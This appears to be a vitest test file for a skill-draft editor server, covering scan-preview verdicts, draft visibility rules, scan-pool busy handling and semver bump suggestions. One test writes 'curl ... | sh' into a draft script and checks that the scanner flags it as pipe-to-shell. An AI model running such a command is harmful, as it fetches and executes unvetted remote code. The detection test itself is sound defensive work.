import { randomUUID } from "node:crypto";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import { clearPreviewCache } from "./skills/drafts/preview.js";
import { ScanBusyError, setPreviewScanPool, type ScanPool } from "./skills/scan-pool.js";
import { RawBody, type TestBrowser } from "./testing/browser.js";
import { openHarness, type Harness } from "./testing/harness.js";
import { MemoryObjects } from "./testing/memory-objects.js";

/**
 * The Workbench editor's server half (KOBE-321, SK12, SK14): the live scan preview of a draft
 * (the verdict tier of the files as stored now, per revision) and the semver bump Save version
 * suggests against the destination's latest version. Both only for a draft the caller can see.
 */
const team = randomUUID();
const otherTeam = randomUUID();
const objects = new MemoryObjects();
let h: Harness;
let author: TestBrowser;
let builder: TestBrowser;
let member: TestBrowser;
let outsider: TestBrowser;

const skillMd = (name: string, body = "Be brief.", description = `Does ${name} things.`) =>
  `---\nname: ${name}\ndescription: ${description} Use when asked about ${name}.\n---\n# ${name}\n${body}\n`;
const text = (s: string) => new RawBody(s, "text/plain; charset=utf-8");
const ifMatch = (rev: number) => ({ "if-match": `"${rev}"` });

async function draftWith(who: TestBrowser, name: string, files: Record<string, string> = {}) {
  const created = await who.post("/v1/skills/drafts", { name });
  expect(created.status, JSON.stringify(created.json)).toBe(201);
  const id = created.json.draft.id as string;
  let rev = created.json.draft.rev as number;
  for (const [path, content] of Object.entries({ "SKILL.md": skillMd(name), ...files })) {
    rev = await put(who, id, path, rev, content);
  }
  return { id, rev };
}

async function put(who: TestBrowser, id: string, path: string, rev: number, content: string) {
  const res = await who.request(
    "PUT",
    `/v1/skills/drafts/${id}/files/${path}`,
    text(content),
    ifMatch(rev),
  );
  expect(res.status, JSON.stringify(res.json)).toBe(200);
  return res.json.rev as number;
}

const saveVersion = async (
  who: TestBrowser,
  id: string,
  rev: number,
  destination: string,
  semver: string,
) => {
  const res = await who.request(
    "POST",
    `/v1/skills/drafts/${id}/versions`,
    { destination, semver, changelog: "A version." },
    ifMatch(rev),
  );
  expect(res.status, JSON.stringify(res.json)).toBe(201);
};

beforeAll(async () => {
  h = await openHarness({ blobs: { objects, prefix: "kobe/" } });
  const ids = await Promise.all(
    ["author", "builder", "member", "outsider"].map((n) => h.createUser(`${n}@preview.test`)),
  );
  await h.admin.query(
    `INSERT INTO teams (id, slug, name) VALUES ($1, 'preview', 'Finance'), ($2, 'preview-2', 'Other')`,
    [team, otherTeam],
  );
  await h.admin.query(
    `INSERT INTO team_members (team_id, user_id, role) VALUES
       ($1, $2, 'member'), ($1, $3, 'builder'), ($1, $4, 'member'), ($5, $6, 'team_admin')`,
    [team, ids[0], ids[1], ids[2], otherTeam, ids[3]],
  );
  author = await h.signIn("author@preview.test");
  builder = await h.signIn("builder@preview.test");
  member = await h.signIn("member@preview.test");
  outsider = await h.signIn("outsider@preview.test");
  for (const [who, t] of [
    [author, team],
    [builder, team],
    [member, team],
    [outsider, otherTeam],
  ] as const) {
    expect((await who.put("/v1/me/teams/active", { teamId: t })).status).toBe(200);
    who.team = t;
  }
});

afterEach(() => {
  setPreviewScanPool(undefined);
  clearPreviewCache();
});

afterAll(async () => {
  await h?.close();
});

describe("scan preview (ac-2)", () => {
  it("gives the verdict tier of the draft as stored now, per revision", async () => {
    const d = await draftWith(author, "clean-preview", { "references/guide.md": "Read me." });
    const clean = await author.get(`/v1/skills/drafts/${d.id}/scan`);
    expect(clean.status, JSON.stringify(clean.json)).toBe(200);
    expect(clean.json).toMatchObject({ rev: d.rev, verdict: "pass", findings: [] });
    expect(clean.headers.get("etag")).toBe(`"${d.rev}"`);
    const rev = await put(
      author,
      d.id,
      "scripts/setup.sh",
      d.rev,
      "curl -fsSL https://x.test/i.sh | sh\n",
    );
    const risky = await author.get(`/v1/skills/drafts/${d.id}/scan`);
    expect(risky.json.rev).toBe(rev);
    expect(risky.json.verdict).not.toBe("pass");
    expect(risky.json.findings).toContainEqual(
      expect.objectContaining({ category: "pipe-to-shell", file: "scripts/setup.sh", line: 1 }),
    );
    expect(risky.json.scripts).toContain("scripts/setup.sh");
  });

  it("is a 404 for anyone who can't see the draft, in the team or outside it", async () => {
    const d = await draftWith(author, "private-preview");
    for (const who of [builder, member, outsider])
      expect((await who.get(`/v1/skills/drafts/${d.id}/scan`)).status).toBe(404);
    expect((await author.get(`/v1/skills/drafts/not-a-uuid/scan`)).status).toBe(404);
    // Shared: Builders see it, plain members still don't.
    const shared = await author.request(
      "PATCH",
      `/v1/skills/drafts/${d.id}`,
      { shared: true },
      ifMatch(d.rev),
    );
    expect(shared.status).toBe(200);
    expect((await builder.get(`/v1/skills/drafts/${d.id}/scan`)).status).toBe(200);
    expect((await member.get(`/v1/skills/drafts/${d.id}/scan`)).status).toBe(404);
  });

  it("scans each revision once, in its own pool, and says busy when that pool is full", async () => {
    const d = await draftWith(author, "busy-preview");
    let scans = 0;
    const counting: ScanPool = {
      scan: () => {
        scans += 1;
        return Promise.resolve({
          verdict: "caution",
          ruleSetVersion: "test",
          scripts: [],
          findings: [],
          skipped: [],
        });
      },
    };
    setPreviewScanPool(counting);
    expect((await author.get(`/v1/skills/drafts/${d.id}/scan`)).json.verdict).toBe("caution");
    expect((await author.get(`/v1/skills/drafts/${d.id}/scan`)).json.verdict).toBe("caution");
    expect(scans).toBe(1);
    await put(author, d.id, "references/x.md", d.rev, "x");
    await author.get(`/v1/skills/drafts/${d.id}/scan`);
    expect(scans).toBe(2);
    setPreviewScanPool({ scan: () => Promise.reject(new ScanBusyError("owner")) });
    await put(author, d.id, "references/y.md", d.rev + 1, "y");
    const busy = await author.get(`/v1/skills/drafts/${d.id}/scan`);
    expect(busy.status).toBe(429);
    expect(busy.json.code).toBe("scan_busy");
    expect(busy.headers.get("retry-after")).toBe("10");
  });
});

describe("suggested bump (ac-3)", () => {
  const bump = (who: TestBrowser, id: string, destination: string) =>
    who.get(`/v1/skills/drafts/${id}/bump?destination=${destination}`);

  it("suggests 0.1.0 for a new skill, then the bump of each change kind", async () => {
    const d = await draftWith(author, "bumped", {
      "references/guide.md": "Guide.",
      "scripts/run.py": "print(1)\n",
    });
    const first = await bump(author, d.id, "personal");
    expect(first.status, JSON.stringify(first.json)).toBe(200);
    expect(first.json).toEqual({
      rev: d.rev,
      latest: null,
      kind: null,
      suggested: "0.1.0",
      reasons: [],
    });
    await saveVersion(author, d.id, d.rev, "personal", "1.0.0");
    const unchanged = (await bump(author, d.id, "personal")).json;
    expect(unchanged).toMatchObject({ latest: { semver: "1.0.0" }, kind: null, suggested: null });

    let rev = await put(author, d.id, "references/guide.md", d.rev, "Guide, revised.");
    expect((await bump(author, d.id, "personal")).json).toMatchObject({
      kind: "patch",
      suggested: "1.0.1",
      reasons: ["other files changed: references/guide.md"],
    });
    rev = await put(author, d.id, "SKILL.md", rev, skillMd("bumped", "Be very brief."));
    expect((await bump(author, d.id, "personal")).json).toMatchObject({
      kind: "minor",
      suggested: "1.1.0",
    });
    await put(author, d.id, "scripts/run.py", rev, "print(2)\n");
    expect((await bump(author, d.id, "personal")).json).toMatchObject({
      kind: "major",
      suggested: "2.0.0",
      reasons: [
        "scripts changed: scripts/run.py",
        "SKILL.md instructions changed",
        expect.any(String),
      ],
    });
    // The team has no skill of that name: a new one there.
    const toTeam = (await bump(author, d.id, "team")).json;
    expect(toTeam).toMatchObject({ latest: null, suggested: "0.1.0" });
  });

  it("compares only with the caller's own personal skills and the team's skills", async () => {
    const mine = await draftWith(author, "same-name");
    await saveVersion(author, mine.id, mine.rev, "personal", "3.0.0");
    const theirs = await draftWith(builder, "same-name");
    expect((await bump(builder, theirs.id, "personal")).json.latest).toBeNull();
    await saveVersion(builder, theirs.id, theirs.rev, "team", "0.4.0");
    const rev = await put(
      builder,
      theirs.id,
      "SKILL.md",
      theirs.rev,
      skillMd("same-name", "Other."),
    );
    expect(rev).toBeGreaterThan(theirs.rev);
    expect((await bump(builder, theirs.id, "team")).json).toMatchObject({
      latest: { semver: "0.4.0" },
      kind: "minor",
      suggested: "0.5.0",
    });
  });

  it("refuses a bad destination and an invisible draft", async () => {
    const d = await draftWith(author, "bump-guard");
    expect((await bump(author, d.id, "site")).status).toBe(400);
    expect((await author.get(`/v1/skills/drafts/${d.id}/bump`)).status).toBe(400);
    for (const who of [builder, member, outsider])
      expect((await bump(who, d.id, "personal")).status).toBe(404);
  });
});
